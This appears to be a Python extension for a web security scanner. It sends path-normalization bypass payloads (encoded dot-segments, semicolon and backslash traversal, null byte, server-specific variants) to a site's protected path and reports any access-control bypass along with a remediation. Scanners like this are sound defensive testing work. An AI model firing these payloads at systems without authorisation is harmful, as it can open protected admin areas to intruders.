"""Backslash Powered Scanner — path normalization attacks.

Tests ..;/, \\..\\..\\, %2e%2e/, URL-encoded dot-segments and other path normalization tricks.
"""

from __future__ import annotations

import logging
from typing import Any
from urllib.parse import urlparse

import httpx

from models import ScanFinding

log = logging.getLogger("ext-backslash-scanner")

NAME = "backslash-scanner"
DESCRIPTION = "Path normalization: ..;/, \\..\\..\\, %2e%2e/, URL-encoded dot-segments"
CHECK_TYPE = "active"
ENABLED = False

_config: dict[str, Any] = {
    "protected_path": "/admin",     # Path to try to reach
}


def configure(config: dict) -> dict:
    _config.update(config)
    return {"status": "configured", "config": _config}


def get_state() -> dict:
    return {"config": _config}


# Path normalization bypass payloads
NORMALIZATION_PAYLOADS = [
    # Semicolon path parameter
    ("..;/", "semicolon-traversal"),
    ("..;/..;/", "double-semicolon-traversal"),
    # Backslash variants
    ("..\\", "backslash-traversal"),
    ("..\\..\\", "double-backslash-traversal"),
    # URL encoding
    ("%2e%2e/", "url-encoded-dots"),
    ("%2e%2e%2f", "full-url-encoded"),
    ("..%2f", "partial-url-encoded"),
    ("%2e%2e\\", "encoded-dots-backslash"),
    # Double URL encoding
    ("%252e%252e/", "double-encoded-dots"),
    ("%252e%252e%252f", "double-encoded-full"),
    # Unicode normalization
    ("..%c0%af", "unicode-slash"),
    ("..%ef%bc%8f", "fullwidth-slash"),
    # Null byte
    ("..%00/", "null-byte-traversal"),
    # Mixed
    ("..\\/", "mixed-slash"),
    ("..%5c", "encoded-backslash"),
    ("..%255c", "double-encoded-backslash"),
    # Spring-specific
    ("/..;/", "spring-semicolon"),
    ("/%2e%2e/", "spring-encoded"),
    # Tomcat-specific
    ("/..;jsessionid=x/", "tomcat-session"),
    # IIS-specific
    ("/~1/", "iis-tilde"),
]


async def active_check(url: str) -> list[ScanFinding]:
    """Test path normalization bypasses."""
    findings = []
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    protected_path = _config.get("protected_path", "/admin")

    async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
        # First, get baseline for protected path (should be 403/401)
        try:
            baseline = await client.get(f"{base}{protected_path}", follow_redirects=False)
            if baseline.status_code in (200, 301, 302):
                # Path isn't actually protected, skip
                return findings
        except Exception:
            return findings

        # Also get baseline for root to compare
        try:
            root_resp = await client.get(f"{base}/", follow_redirects=False)
        except Exception:
            return findings

        # Test each normalization payload
        for payload, technique in NORMALIZATION_PAYLOADS:
            # Try: /public_path/{payload}/protected_path
            test_paths = [
                f"/{payload}{protected_path}",
                f"/public{payload}{protected_path}",
                f"{protected_path}/{payload}../",
                f"/{payload}{protected_path.lstrip('/')}",
            ]

            for test_path in test_paths:
                try:
                    resp = await client.get(f"{base}{test_path}", follow_redirects=False)

                    # Check if we bypassed the protection
                    if resp.status_code == 200 and baseline.status_code in (401, 403, 404):
                        # Verify it's not just the root page
                        if abs(len(resp.content) - len(root_resp.content)) > 100:
                            findings.append(ScanFinding(
                                template_id=f"path_normalization_{technique}",
                                name=f"Path Normalization Bypass ({technique})",
                                severity="high",
                                url=url,
                                matched_at=f"{base}{test_path}",
                                description=f"Path normalization bypass via '{payload}' technique. Protected path '{protected_path}' accessible.",
                                extracted=[test_path, f"status={resp.status_code}", f"technique={technique}"],
                                source="extension",
                                confidence="firm",
                                remediation="Normalize paths before applying access control. Use framework-level URL normalization.",
                            ))
                            return findings  # One confirmed is enough
                except Exception:
                    continue

    return findings
